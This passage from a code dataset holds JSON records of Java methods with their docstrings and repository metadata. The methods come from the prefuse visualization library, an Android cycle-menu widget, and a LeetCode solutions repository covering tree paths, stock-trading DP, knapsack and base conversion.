m_names[m_size] = name;\n    m_types[m_size] = type;\n    m_dflts[m_size] = defaultValue;\n    \n    if ( m_lookup != null )\n        m_lookup.put(name, new Integer(m_size));\n    \n    ++m_size;\n}", "path": "src\\prefuse\\data\\Schema.java", "repo_name": "prefuse/Prefuse", "stars": 555, "license": "other", "language": "java", "size": 4245}
{"docstring": "/**\n * The default value of the column with the given name.\n * @param field the column name\n * @return the column's default value\n */\n", "func_signal": "public Object getDefault(String field)", "code": "{\n    int idx = getColumnIndex(field);\n    return ( idx<0 ? null : m_dflts[idx] );\n}", "path": "src\\prefuse\\data\\Schema.java", "repo_name": "prefuse/Prefuse", "stars": 555, "license": "other", "language": "java", "size": 4245}
{"docstring": "/**\n * Create a new schema consisting of the given column names and types.\n * @param names the column names\n * @param types the column types (as Class instances)\n */\n", "func_signal": "public Schema(String[] names, Class[] types)", "code": "{\n    this(names.length);\n    \n    // check the schema validity\n    if ( names.length != types.length ) {\n        throw new IllegalArgumentException(\n            \"Input arrays should be the same length\");\n    }\n    for ( int i=0; i<names.length; ++i ) {\n        addColumn(names[i], types[i], null);\n    }\n}", "path": "src\\prefuse\\data\\Schema.java", "repo_name": "prefuse/Prefuse", "stars": 555, "license": "other", "language": "java", "size": 4245}
{"docstring": "/**\n * @see prefuse.controls.Control#itemDragged(prefuse.visual.VisualItem, java.awt.event.MouseEvent)\n */\n", "func_signal": "public void itemDragged(VisualItem item, MouseEvent e)", "code": "{\n    if ( m_panOverItem )\n        mouseDragged(e);\n}", "path": "src\\prefuse\\controls\\PanControl.java", "repo_name": "prefuse/Prefuse", "stars": 555, "license": "other", "language": "java", "size": 4245}
{"docstring": "/**\n * Set the default value for the given field.\n * @param field the name of column to set the default for\n * @param val the new default value\n */\n", "func_signal": "public void setDefault(String field, Object val)", "code": "{\n    // check lock status\n    if ( m_locked ) {\n        throw new IllegalStateException(\n            \"Can not update default values of a locked Schema.\");\n    }\n    int idx = getColumnIndex(field);\n    m_dflts[idx] = val;\n}", "path": "src\\prefuse\\data\\Schema.java", "repo_name": "prefuse/Prefuse", "stars": 555, "license": "other", "language": "java", "size": 4245}
{"docstring": "/**\n * Create a new schema consisting of the given column names, types, and\n * default column values.\n * @param names the column names\n * @param types the column types (as Class instances)\n * @param defaults the default values for each column\n */\n", "func_signal": "public Schema(String[] names, Class[] types, Object[] defaults)", "code": "{\n    this(names.length);\n    \n    // check the schema validity\n    if ( names.length != types.length || \n         types.length != defaults.length )\n    {\n        throw new IllegalArgumentException(\n            \"Input arrays should be the same length\");\n    }\n    for ( int i=0; i<names.length; ++i ) {\n        addColumn(names[i], types[i], defaults[i]);\n    }\n}", "path": "src\\prefuse\\data\\Schema.java", "repo_name": "prefuse/Prefuse", "stars": 555, "license": "other", "language": "java", "size": 4245}
{"docstring": "/**\n * The column index for the column with the given name.\n * @param field the column name\n * @return the column index\n */\n", "func_signal": "public int getColumnIndex(String field)", "code": "{\n    if ( m_lookup == null )\n        initLookup();\n    \n    Integer idx = (Integer)m_lookup.get(field);\n    return ( idx==null ? -1 : idx.intValue() );\n}", "path": "src\\prefuse\\data\\Schema.java", "repo_name": "prefuse/Prefuse", "stars": 555, "license": "other", "language": "java", "size": 4245}
{"docstring": "/**\n * Compares this schema with another one for equality.\n */\n", "func_signal": "public boolean equals(Object o)", "code": "{\n    if ( !(o instanceof Schema) )\n        return false;\n    \n    Schema s = (Schema)o;\n    if ( m_size != s.getColumnCount() )\n        return false;\n    \n    for ( int i=0; i<m_size; ++i ) {\n        if ( !(m_names[i].equals(s.getColumnName(i)) &&\n               m_types[i].equals(s.getColumnType(i)) &&\n               m_dflts[i].equals(s.getDefault(i))) )\n        {\n            return false;\n        }\n    }\n    return true;\n}", "path": "src\\prefuse\\data\\Schema.java", "repo_name": "prefuse/Prefuse", "stars": 555, "license": "other", "language": "java", "size": 4245}
{"docstring": "/**\n * Create a new PanControl\n * @param mouseButton the mouse button that should initiate a pan. One of\n * {@link Control#LEFT_MOUSE_BUTTON}, {@link Control#MIDDLE_MOUSE_BUTTON},\n * or {@link Control#RIGHT_MOUSE_BUTTON}.\n * @param panOverItem if true, the panning control will work even while\n * the mouse is over a visual item.\n */\n", "func_signal": "public PanControl(int mouseButton, boolean panOverItem)", "code": "{\n    m_button = mouseButton;\n    m_panOverItem = panOverItem;\n}", "path": "src\\prefuse\\controls\\PanControl.java", "repo_name": "prefuse/Prefuse", "stars": 555, "license": "other", "language": "java", "size": 4245}
{"docstring": "/**\n * Close cycle menu.\n *\n * @param animated - indicate if need to close cycle menu with animation (true), immediately otherwise\n */\n", "func_signal": "public void close(boolean animated)", "code": "{\n    if (animated) {\n        scrollEnabled(false);\n        mState = STATE.IN_CLOSE_PROCESS;\n        sendState();\n        mCenterImage.animate()\n                .rotation(0)\n                .setInterpolator(new OvershootInterpolator(2))\n                .setDuration(CENTER_IMAGE_ROTATE_DURATION)\n                .start();\n        mLayoutManager.rollOutItemsWithAnimation(new CycleLayoutManager.OnCompleteCallback() {\n            @Override\n            public void onComplete() {\n                innerAnimatedClose();\n            }\n        });\n    } else {\n        scrollEnabled(true);\n        mState = STATE.CLOSED;\n        sendState();\n        mVariableShadowSize = mShadowSize * SHADOW_SIZE_MIN_COEFFICIENT;\n        mCenterImage.setRotation(0);\n        mAnimationCircleRadius = mCircleMinRadius;\n        invalidate();\n    }\n}", "path": "cycle_menu\\src\\main\\java\\com\\cleveroad\\sy\\cyclemenuwidget\\CycleMenuWidget.java", "repo_name": "Cleveroad/CycleMenu", "stars": 573, "license": "None", "language": "java", "size": 2197}
{"docstring": "/**\n * Set current offset of the firstItem as an angle (in degrees)\n *\n * @param angle - offset that need to set for the first item (and next) in degrees\n */\n", "func_signal": "public void setCurrentItemsAngleOffset(double angle)", "code": "{\n    mCurrentAngleOffset = angle;\n    mLayoutManager.setAdditionalAngleOffset(angle);\n}", "path": "cycle_menu\\src\\main\\java\\com\\cleveroad\\sy\\cyclemenuwidget\\CycleMenuWidget.java", "repo_name": "Cleveroad/CycleMenu", "stars": 573, "license": "None", "language": "java", "size": 2197}
{"docstring": "/**\n * fill to up items from the anchor item\n *\n * @param anchorView\n * @param recycler\n */\n", "func_signal": "private void fillUp(@Nullable View anchorView, RecyclerView.Recycler recycler)", "code": "{\n    int anchorPos;\n    if (anchorView != null) {\n        anchorPos = getPosition(anchorView);\n    } else {\n        return;\n    }\n\n    int pos = anchorPos - 1;\n    if (mScrollToPosition != RecyclerView.NO_POSITION) {\n        pos = mScrollToPosition - 1;\n    }\n    boolean canFillUp;\n    int radius = getRadius();\n    double angle;\n    if (mCurrentCorner.isLeftSide()) {\n        canFillUp = anchorView.getLeft() > 0;\n    } else {\n        canFillUp = anchorView.getRight() < getWidth();\n    }\n    angle = mViewAngles.get(anchorPos) + mAnglePerItem;\n    //Can be used View.MeasureSpec.AT_MOST because items is floating action buttons\n    final int widthSpec = View.MeasureSpec.makeMeasureSpec(getWidth(), View.MeasureSpec.AT_MOST);\n    final int heightSpec = View.MeasureSpec.makeMeasureSpec(getHeight(), View.MeasureSpec.AT_MOST);\n\n    int top;\n    int bottom;\n    int right;\n    int left;\n\n    while (canFillUp && pos >= 0) {\n        View view = mViewCache.get(pos);\n\n        if (view == null) {\n            mViewAngles.put(pos, angle);\n            view = recycler.getViewForPosition(pos);\n            addView(view, 0);\n            measureChildWithMargins(view, widthSpec, heightSpec);\n            int decoratedMeasuredWidth = getDecoratedMeasuredWidth(view);\n            int decoratedMeasuredHeight = getDecoratedMeasuredHeight(view);\n\n            //position of the new item\n            int xDistance = (int) (radius * Math.cos(angle * Math.PI / 180));\n            int yDistance = (int) (radius * Math.sin(angle * Math.PI / 180));\n\n            left = xDistance - decoratedMeasuredWidth / 2;\n            right = xDistance + decoratedMeasuredWidth / 2;\n            top = yDistance - decoratedMeasuredHeight / 2;\n            bottom = yDistance + decoratedMeasuredHeight / 2;\n\n            //changes for each corners except left_top\n            if (mCurrentCorner == CORNER.RIGHT_TOP) {\n                left = getWidth() - xDistance - decoratedMeasuredWidth / 2;\n                right = getWidth() - xDistance + decoratedMeasuredWidth / 2;\n            } else if (mCurrentCorner == CORNER.LEFT_BOTTOM) {\n                top = getHeight() - yDistance - decoratedMeasuredHeight / 2;\n                bottom = getHeight() - yDistance + decoratedMeasuredHeight / 2;\n            } else if (mCurrentCorner == CORNER.RIGHT_BOTTOM) {\n                left = getWidth() - xDistance - decoratedMeasuredWidth / 2;\n                right = getWidth() - xDistance + decoratedMeasuredWidth / 2;\n                top = getHeight() - yDistance - decoratedMeasuredHeight / 2;\n                bottom = getHeight() - yDistance + decoratedMeasuredHeight / 2;\n            }\n\n            layoutDecorated(view, left, top, right, bottom);\n\n        } else {\n            attachView(view);\n            mViewCache.remove(pos);\n            left = view.getLeft();\n            right = view.getRight();\n        }\n        pos--;\n        //Check if top not reached\n        if (mCurrentCorner.isLeftSide()) {\n            canFillUp = left > 0;\n        } else if (mCurrentCorner.isRightSide()) {\n            canFillUp = right < getWidth();\n        }\n        angle += mAnglePerItem;\n\n    }\n}", "path": "cycle_menu\\src\\main\\java\\com\\cleveroad\\sy\\cyclemenuwidget\\CycleLayoutManager.java", "repo_name": "Cleveroad/CycleMenu", "stars": 573, "license": "None", "language": "java", "size": 2197}
{"docstring": "/**\n * Set the scaling type which will be used to calculate radius for the cycle menu.\n *\n * @param scalingType type of scaling AUTO,FIXED\n */\n", "func_signal": "public void setScalingType(@NonNull RADIUS_SCALING_TYPE scalingType)", "code": "{\n    checkNonNullParams(scalingType, FIELD_NAME_FOR_EXCEPTION_SCALING_TYPE);\n    mInitialized = false;\n    mScalingType = scalingType;\n}", "path": "cycle_menu\\src\\main\\java\\com\\cleveroad\\sy\\cyclemenuwidget\\CycleMenuWidget.java", "repo_name": "Cleveroad/CycleMenu", "stars": 573, "license": "None", "language": "java", "size": 2197}
{"docstring": "/**\n * Set the menu items from the Menu object\n *\n * @param menu menu object from which need to get menuItems and add to the cycleMenu\n */\n", "func_signal": "public void setMenu(@NonNull Menu menu)", "code": "{\n    checkNonNullParams(menu, FIELD_NAME_FOR_EXCEPTION_MENU);\n    mInitialized = false;\n    for (int i = 0; i < menu.size(); i++) {\n        MenuItem menuItem = menu.getItem(i);\n        CycleMenuItem cycleMenuItem = new CycleMenuItem(menuItem.getItemId(), menuItem.getIcon());\n        mAdapter.addItem(cycleMenuItem);\n    }\n    mAdapter.notifyDataSetChanged();\n}", "path": "cycle_menu\\src\\main\\java\\com\\cleveroad\\sy\\cyclemenuwidget\\CycleMenuWidget.java", "repo_name": "Cleveroad/CycleMenu", "stars": 573, "license": "None", "language": "java", "size": 2197}
{"docstring": "/**\n * Applies a color to the CycleMenuWidget background\n *\n * @param backgroundColor color to set\n */\n", "func_signal": "public void setBackground(int backgroundColor)", "code": "{\n    mBackgroundColor = backgroundColor;\n    mCirclePaint.setColor(mBackgroundColor);\n    invalidate();\n}", "path": "cycle_menu\\src\\main\\java\\com\\cleveroad\\sy\\cyclemenuwidget\\CycleMenuWidget.java", "repo_name": "Cleveroad/CycleMenu", "stars": 573, "license": "None", "language": "java", "size": 2197}
{"docstring": "/**\n * enable/disable of items scrolling.\n *\n * @param enabled - scroll enabling value\n */\n", "func_signal": "private void scrollEnabled(boolean enabled)", "code": "{\n    mRecyclerView.setTouchEnabled(enabled);\n    mLayoutManager.setScrollEnabled(enabled);\n}", "path": "cycle_menu\\src\\main\\java\\com\\cleveroad\\sy\\cyclemenuwidget\\CycleMenuWidget.java", "repo_name": "Cleveroad/CycleMenu", "stars": 573, "license": "None", "language": "java", "size": 2197}
{"docstring": "/**\n * Build path for circular shadow.\n */\n", "func_signal": "private void buildShadowCorners()", "code": "{\n    float mCornerRadius = mAnimationCircleRadius;\n\n    RectF innerBounds = new RectF(getWidth() - mCornerRadius, -mCornerRadius, getWidth() + mCornerRadius, mCornerRadius);\n    RectF outerBounds = new RectF(innerBounds);\n    outerBounds.inset(-mVariableShadowSize, -mVariableShadowSize);\n\n    if (mCornerShadowPath == null) {\n        mCornerShadowPath = new Path();\n    } else {\n        mCornerShadowPath.reset();\n    }\n    mCornerShadowPath.setFillType(Path.FillType.EVEN_ODD);\n    mCornerShadowPath.moveTo(getWidth() - mCornerRadius, 0);\n\n    mCornerShadowPath.rLineTo(-mVariableShadowSize, 0);\n    // outer arc\n    mCornerShadowPath.arcTo(outerBounds, 180f, -90f, false);\n    // inner arc\n    mCornerShadowPath.arcTo(innerBounds, 90f, 90f, false);\n\n    float shadowRadius = -outerBounds.top;\n    if (shadowRadius > 0f) {\n        float startRatio = mCornerRadius / shadowRadius;\n        float midRatio = startRatio + ((1f - startRatio) / 2f);\n        RadialGradient gradient = new RadialGradient(getWidth(), 0, shadowRadius,\n                new int[]{0, mShadowStartColor, mShadowMiddleColor, mShadowEndColor},\n                new float[]{0f, startRatio, midRatio, 1f},\n                Shader.TileMode.CLAMP);\n        mCornerShadowPaint.setShader(gradient);\n    }\n}", "path": "cycle_menu\\src\\main\\java\\com\\cleveroad\\sy\\cyclemenuwidget\\CycleMenuWidget.java", "repo_name": "Cleveroad/CycleMenu", "stars": 573, "license": "None", "language": "java", "size": 2197}
{"docstring": "/**\n * Set the scaling type which will be used to calculate radius for the cycle menu.\n *\n * @param corner - mCorner to set for the menu LEFT_TOP, RIGHT_TOP, LEFT_BOTTOM, RIGHT_BOTTOM\n */\n", "func_signal": "public void setCorner(@NonNull CORNER corner)", "code": "{\n    checkNonNullParams(corner, FIELD_NAME_FOR_EXCEPTION_CORNER);\n    mInitialized = false;\n    mLayoutManager.setCorner(corner);\n    mCorner = corner;\n}", "path": "cycle_menu\\src\\main\\java\\com\\cleveroad\\sy\\cyclemenuwidget\\CycleMenuWidget.java", "repo_name": "Cleveroad/CycleMenu", "stars": 573, "license": "None", "language": "java", "size": 2197}
{"docstring": "/**\n * Applies a fixed radius for the menu. Will be used if scaling_type set to {@code RADIUS_SCALING_TYPE.FIXED}\n *\n * @param fixedRadius - fixed radius to set\n */\n", "func_signal": "public void setFixedRadius(int fixedRadius)", "code": "{\n    mInitialized = false;\n    mFixedRadius = fixedRadius;\n}", "path": "cycle_menu\\src\\main\\java\\com\\cleveroad\\sy\\cyclemenuwidget\\CycleMenuWidget.java", "repo_name": "Cleveroad/CycleMenu", "stars": 573, "license": "None", "language": "java", "size": 2197}
{"docstring": "/**\n * Change menu mState open -> close, close -> open if don't doing open/close right now.\n */\n", "func_signal": "private void changeMenuState()", "code": "{\n    if (mState == STATE.IN_OPEN_PROCESS || mState == STATE.IN_CLOSE_PROCESS) {\n        return;\n    }\n    if (mState == STATE.OPEN) {\n        close(true);\n        return;\n    }\n    open(true);\n}", "path": "cycle_menu\\src\\main\\java\\com\\cleveroad\\sy\\cyclemenuwidget\\CycleMenuWidget.java", "repo_name": "Cleveroad/CycleMenu", "stars": 573, "license": "None", "language": "java", "size": 2197}
{"docstring": "/**\n * Method to check if the end is reached with scrolling\n *\n * @param dy value to scroll\n * @return available value to scroll.\n */\n", "func_signal": "private int checkEndsReached(int dy)", "code": "{\n    int childCount = getChildCount();\n    int itemCount = getItemCount();\n    if (childCount == 0) {\n        return 0;\n    }\n\n    int delta = 0;\n    View firstChildView = getChildAt(0);\n    View lastChildView = getChildAt(childCount - 1);\n\n    if (dy < 0) { //scroll to bottom if menu corner is top side, to up if menu corner is bottom side\n        if (getPosition(lastChildView) < itemCount - 1) { //if last item not reached\n            delta = dy;\n        } else { //if last item reached\n            if (mCurrentCorner.isBottomSide()) { //scroll from bottom to up\n                int viewBottom = getDecoratedBottom(lastChildView);\n                int parentBottom = getHeight();\n                delta = Math.max(parentBottom - mHalfAdditionalMargin - viewBottom, dy);\n            } else { //scroll from up to down\n                int viewTop = getDecoratedTop(lastChildView);\n                delta = Math.max(viewTop - mHalfAdditionalMargin, dy);\n            }\n        }\n    } else if (dy > 0) { //scroll to up if menu corner is top side, to bottom if menu corner is bottom side\n        if (getPosition(firstChildView) > 0) { //if first item not reached\n            delta = dy;\n        } else {\n            //if first item reached\n            if (mCurrentCorner.isLeftSide()) {\n                int viewLeft = getDecoratedLeft(firstChildView);\n                int parentLeft = 0;\n                delta = Math.min(parentLeft - viewLeft + mHalfAdditionalMargin, dy);\n            } else {\n                int viewRight = getDecoratedRight(firstChildView);\n                int parentRight = getWidth();\n                delta = Math.min(viewRight + mHalfAdditionalMargin - parentRight, dy);\n            }\n        }\n    }\n    return -delta;\n}", "path": "cycle_menu\\src\\main\\java\\com\\cleveroad\\sy\\cyclemenuwidget\\CycleLayoutManager.java", "repo_name": "Cleveroad/CycleMenu", "stars": 573, "license": "None", "language": "java", "size": 2197}
{"docstring": "/**\n * Set current position of the menu to be first\n *\n * @param position - position of the first item\n */\n", "func_signal": "public void setCurrentPosition(int position)", "code": "{\n    if (position != RecyclerView.NO_POSITION) {\n        mCurrentPosition = position;\n    }\n}", "path": "cycle_menu\\src\\main\\java\\com\\cleveroad\\sy\\cyclemenuwidget\\CycleMenuWidget.java", "repo_name": "Cleveroad/CycleMenu", "stars": 573, "license": "None", "language": "java", "size": 2197}
{"docstring": "/**\n * Add the menu item.\n *\n * @param item menu item to add\n */\n", "func_signal": "public void addMenuItem(@NonNull CycleMenuItem item)", "code": "{\n    checkNonNullParams(item, FIELD_NAME_FOR_EXCEPTION_ITEM);\n    mInitialized = false;\n    mAdapter.addItem(item);\n    mAdapter.notifyDataSetChanged();\n}", "path": "cycle_menu\\src\\main\\java\\com\\cleveroad\\sy\\cyclemenuwidget\\CycleMenuWidget.java", "repo_name": "Cleveroad/CycleMenu", "stars": 573, "license": "None", "language": "java", "size": 2197}
{"docstring": "/**\n * Open cycle menu.\n *\n * @param animated - indicate if need to open cycle menu with animation (true), immediately otherwise\n */\n", "func_signal": "public void open(final boolean animated)", "code": "{\n    int centerCrossImageRotateAngle = -45;\n    if (animated) {\n        scrollEnabled(false);\n        mState = STATE.IN_OPEN_PROCESS;\n        sendState();\n        mCenterImage.animate()\n                .rotation(centerCrossImageRotateAngle)\n                .setInterpolator(new OvershootInterpolator(2))\n                .setDuration(CENTER_IMAGE_ROTATE_DURATION)\n                .start();\n\n        ObjectAnimator circleRadiusAnimator = ObjectAnimator.ofInt(this, CIRCLE_RADIUS_ANIMATOR_FIELD_NAME, mCircleMinRadius, mOutCircleRadius);\n        circleRadiusAnimator.addListener(new AnimatorListenerAdapter() {\n            @Override\n            public void onAnimationEnd(Animator animation) {\n                mRecyclerView.setTranslationX(0);\n                mLayoutManager.rollInItemsWithAnimation(new CycleLayoutManager.OnCompleteCallback() {\n                    @Override\n                    public void onComplete() {\n                        mState = STATE.OPEN;\n                        sendState();\n                        scrollEnabled(true);\n                        if (mOnStateChangeListener != null) {\n                            mOnStateChangeListener.onOpenComplete();\n                        }\n                    }\n                });\n            }\n        });\n        ObjectAnimator shadowAnimator = ObjectAnimator.ofFloat(this, SHADOW_SIZE_ANIMATOR_FIELD_NAME, mShadowSize * SHADOW_SIZE_MIN_COEFFICIENT, mShadowSize);\n\n        AnimatorSet animatorSet = new AnimatorSet();\n        animatorSet.setDuration(REVEAL_ANIMATION_DURATION);\n        animatorSet.playTogether(circleRadiusAnimator, shadowAnimator);\n        animatorSet.start();\n    } else {\n        mVariableShadowSize = mShadowSize;\n        mCenterImage.setRotation(centerCrossImageRotateAngle);\n        mAnimationCircleRadius = mOutCircleRadius;\n        mRecyclerView.setTranslationX(0);\n        scrollEnabled(true);\n        mState = STATE.OPEN;\n        sendState();\n        invalidate();\n    }\n}", "path": "cycle_menu\\src\\main\\java\\com\\cleveroad\\sy\\cyclemenuwidget\\CycleMenuWidget.java", "repo_name": "Cleveroad/CycleMenu", "stars": 573, "license": "None", "language": "java", "size": 2197}
{"docstring": "/**\n * Applies a max radius radius for the menu. Will be used if scaling_type set to {@code RADIUS_SCALING_TYPE.AUTO}\n *\n * @param autoMaxRadius max radius to set\n */\n", "func_signal": "public void setAutoMaxRadius(int autoMaxRadius)", "code": "{\n    mInitialized = false;\n    mAutoMaxRadius = autoMaxRadius;\n}", "path": "cycle_menu\\src\\main\\java\\com\\cleveroad\\sy\\cyclemenuwidget\\CycleMenuWidget.java", "repo_name": "Cleveroad/CycleMenu", "stars": 573, "license": "None", "language": "java", "size": 2197}
{"docstring": "/**\n * Getting anchor view for the filling.\n * The first partially visible item\n */\n", "func_signal": "private View getAnchorView()", "code": "{\n    View anchorView;\n    int childCount = getChildCount();\n    if (childCount == 0) {\n        return null;\n    }\n    int anchorViewPosition = 0;\n    if (mCurrentCorner.isLeftSide()) {\n        do {\n            anchorView = getChildAt(anchorViewPosition);\n            anchorViewPosition++;\n        } while (anchorView.getRight() < 0 && anchorViewPosition < childCount);\n    } else {\n        do {\n            anchorView = getChildAt(anchorViewPosition);\n            anchorViewPosition++;\n        } while (anchorView.getLeft() > getWidth() && anchorViewPosition < childCount);\n    }\n\n    return anchorView;\n}", "path": "cycle_menu\\src\\main\\java\\com\\cleveroad\\sy\\cyclemenuwidget\\CycleLayoutManager.java", "repo_name": "Cleveroad/CycleMenu", "stars": 573, "license": "None", "language": "java", "size": 2197}
{"docstring": "/**\n * Applies a min radius radius for the menu. Will be used if scaling_type set to {@code RADIUS_SCALING_TYPE.AUTO}\n *\n * @param autoMinRadius min radius to set\n */\n", "func_signal": "public void setAutoMinRadius(int autoMinRadius)", "code": "{\n    mInitialized = false;\n    mAutoMinRadius = autoMinRadius;\n}", "path": "cycle_menu\\src\\main\\java\\com\\cleveroad\\sy\\cyclemenuwidget\\CycleMenuWidget.java", "repo_name": "Cleveroad/CycleMenu", "stars": 573, "license": "None", "language": "java", "size": 2197}
{"docstring": "/**\n * Set ripple color\n *\n * @param rippleColor color to set\n */\n", "func_signal": "public void setRippleColor(int rippleColor)", "code": "{\n    mRippleColor = rippleColor;\n    setRippleAlpha(Color.alpha(mRippleColor));\n    mRipplePaint.setColor(mRippleColor);\n}", "path": "cycle_menu\\src\\main\\java\\com\\cleveroad\\sy\\cyclemenuwidget\\CycleMenuWidget.java", "repo_name": "Cleveroad/CycleMenu", "stars": 573, "license": "None", "language": "java", "size": 2197}
{"docstring": "/**\n * Applies a tint to the background drawable of the items in cycle menu. Does not modify the current tint\n * mode, which is {@link PorterDuff.Mode#SRC_IN} by default.\n *\n * @param itemsBackgroundTint the tint to apply, may be {@code null} to clear tint\n */\n", "func_signal": "public void setItemsBackgroundTint(@Nullable ColorStateList itemsBackgroundTint)", "code": "{\n    mItemsBackgroundTint = itemsBackgroundTint;\n    mAdapter.setItemsBackgroundTint(itemsBackgroundTint);\n    mAdapter.notifyDataSetChanged();\n}", "path": "cycle_menu\\src\\main\\java\\com\\cleveroad\\sy\\cyclemenuwidget\\CycleMenuWidget.java", "repo_name": "Cleveroad/CycleMenu", "stars": 573, "license": "None", "language": "java", "size": 2197}
{"docstring": "//\u672c\u9898\u6709\u4e2a\u5751\u3002\u7a7a\u6811\u4e00\u5b9a\u8fd4\u56defalse\u3002\u6240\u4ee5\u8981\u5224\u65ad\u5de6\u53f3\u5b50\u6811\u4e3a\u7a7a\u5e76\u4e14val = sum\u3002\n//\u800c\u4e0d\u80fd\u76f4\u63a5\u5224\u65adsum = 0 && root = null\n", "func_signal": "public boolean hasPathSum(TreeNode root, int sum)", "code": "{\n    if (root == null) return false;\n    if (root.left == null && root.right == null && root.val == sum)return true;\n    sum -= root.val;\n    boolean left = hasPathSum(root.left, sum);\n    boolean right = hasPathSum(root.right, sum);\n    return left || right;\n}", "path": "src\\\u6570\u636e\u7ed3\u6784\\\u6811\\\u9012\u5f52\\\u8def\u5f84\\\u5224\u65ad\u8def\u5f84\u548c\u662f\u5426\u7b49\u4e8e\u4e00\u4e2a\u6570.java", "repo_name": "h2pl/leetcode", "stars": 683, "license": "None", "language": "java", "size": 196}
{"docstring": "//\u9519\u8bef\u7684\u89e3\u6cd5\u3002\n//    public static int maxProfit(int[] prices) {\n//        if (prices.length < 2) return 0;\n//        int[] sell = new int[prices.length];\n//        int []cool = new int[prices.length];\n//        int []buy = new int[prices.length];\n//        sell[0] = Integer.MIN_VALUE;\n//        sell[1] = prices[1] - prices[0];\n//        cool[0] = Integer.MIN_VALUE;\n//        cool[1] = Integer.MIN_VALUE;\n//        buy[0] = - prices[0];\n//        buy[1] = - prices[1];\n//        for (int i = 2;i < prices.length;i ++) {\n//            //buy[i] = cool[i - 1]\n//            buy[i] = cool[i - 1];\n//            sell[i] = Math.max(sell[i - 1] + prices[i] - prices[i - 1]  ,buy[i - 1] + prices[i]);\n//            cool[i] = Math.max(cool[i - 1], sell[i - 1]);\n//        }\n//        int max = Math.max(sell[prices.length - 1], cool[prices.length - 1]);\n//        return max;\n//    }\n", "func_signal": "public static int maxProfit(int[] prices)", "code": "{\n    if(prices == null || prices.length < 2){\n        return 0;\n    }\n    int len = prices.length;\n    int[] sell = new int[len]; //sell[i] means must sell at day i\n    int[] cooldown = new int[len]; //cooldown[i] means day i is cooldown day\n    sell[1] = prices[1] - prices[0];\n    for(int i = 2; i < prices.length; ++i){\n        cooldown[i] = Math.max(sell[i - 1], cooldown[i - 1]);\n        sell[i] = prices[i] - prices[i - 1] + Math.max(sell[i - 1], cooldown[i - 2]);\n    }\n    return Math.max(sell[len - 1], cooldown[len - 1]);\n}", "path": "src\\DP\\\u80a1\u7968\u4e70\u5356\\\u9700\u8981\u51b7\u5374\u671f\u7684\u80a1\u7968\u4ea4\u6613_\u53cc\u6570\u7ec4.java", "repo_name": "h2pl/leetcode", "stars": 683, "license": "None", "language": "java", "size": 196}
{"docstring": "//\u548c\u627e\u552f\u4e00\u6570\u4e00\u6837\u7684\u601d\u8def\uff0c\u6570\u7ec4\u4e2d\u7684\u6570\u5168\u90e8\u5f02\u6216\uff0c\u518d\u548c1-n\u7684\u6240\u6709\u6570\u5f02\u6216\u3002\n//\u6700\u540e\u7684\u7ed3\u679c\u5c31\u662f\u7f3a\u5c11\u7684\u90a3\u4e2a\u6570\n", "func_signal": "public int missingNumber(int[] nums)", "code": "{\n    int n = nums.length;\n    int res = 0;\n    for (int i : nums) {\n        res = res ^ i;\n    }\n    for (int i = 0;i <= n;i ++) {\n        res = res ^ i;\n    }\n    return res;\n}", "path": "src\\\u6570\u636e\u7ed3\u6784\\\u4f4d\u8fd0\u7b97\\\u627e\u51fa\u6570\u7ec4\u4e2d\u7f3a\u5931\u7684\u90a3\u4e2a\u6570.java", "repo_name": "h2pl/leetcode", "stars": 683, "license": "None", "language": "java", "size": 196}
{"docstring": "//\u5148\u627e\u5230\u6700\u5c0f\u503c\uff0c\u518d\u627e\u7b2c\u4e8c\u5c0f\u503c\n", "func_signal": "public int findSecondMinimumValue(TreeNode root)", "code": "{\n    if (root == null)return -1;\n    int first = findMin(root, Integer.MAX_VALUE, -1);\n    int second = findMin(root, Integer.MAX_VALUE, first);\n    if (second == Integer.MAX_VALUE)return - 1;\n    return second;\n}", "path": "src\\\u6570\u636e\u7ed3\u6784\\\u6811\\\u9012\u5f52\\\u8282\u70b9\\\u627e\u51fa\u4e8c\u53c9\u6811\u4e2d\u7b2c\u4e8c\u5c0f\u7684\u8282\u70b9.java", "repo_name": "h2pl/leetcode", "stars": 683, "license": "None", "language": "java", "size": 196}
{"docstring": "//\u8fd9\u9898\u7684\u6d4b\u8bd5\u7528\u4f8b\u6709\u70b9\u95ee\u9898\n", "func_signal": "public int[] nextGreaterElement(int[] nums1, int[] nums2)", "code": "{\n    int []big = new int[nums1.length];\n    Arrays.fill(big, -1);\n    for (int i = 0;i < nums1.length;i ++) {\n        for (int j = i + 1;j < nums2.length;j ++) {\n            if (nums2[j] > nums1[i]) {\n                big[i] = nums2[j];\n                break;\n            }\n        }\n    }\n    return big;\n}", "path": "src\\\u6570\u636e\u7ed3\u6784\\\u6808\u548c\u961f\u5217\\\u5728\u53e6\u4e00\u4e2a\u6570\u7ec4\u4e2d\u6bd4\u5f53\u524d\u5143\u7d20\u5927\u7684\u4e0b\u4e00\u4e2a\u5143\u7d20.java", "repo_name": "h2pl/leetcode", "stars": 683, "license": "None", "language": "java", "size": 196}
{"docstring": "//\u4f18\u5316\u6210\u4e00\u7ef4\u540e\u89e3\u6cd5 \u4e0d\u5fc5\u88c5\u6ee1\n", "func_signal": "public int knapsack2(int W, int N, int[] weights, int[] values)", "code": "{\n    int[]dp = new int[W + 1];\n    for (int i = 1; i <= N; i++) {\n        int w = weights[i - 1], v = values[i - 1];\n        for (int j = w; j <= W; j ++) {\n            if (j >= w) {\n                dp[j] = Math.max(dp[j], dp[j - w] + v);\n            }\n        }\n    }\n    return dp[W];\n}", "path": "src\\DP\\\u80cc\u5305\\\u5b8c\u5168\u80cc\u5305.java", "repo_name": "h2pl/leetcode", "stars": 683, "license": "None", "language": "java", "size": 196}
{"docstring": "//\u7528\u6808\u8fdb\u884c\u8fdb\u5236\u8f6c\u6362\n", "func_signal": "public static void main(String[] args)", "code": "{\n    System.out.println(convertToBase7(-8));\n    System.out.println(convertToBase7(-7));\n}", "path": "src\\\u6570\u5b66\\\u8fdb\u5236\u8f6c\u6362\\\u4e03\u8fdb\u5236.java", "repo_name": "h2pl/leetcode", "stars": 683, "license": "None", "language": "java", "size": 196}
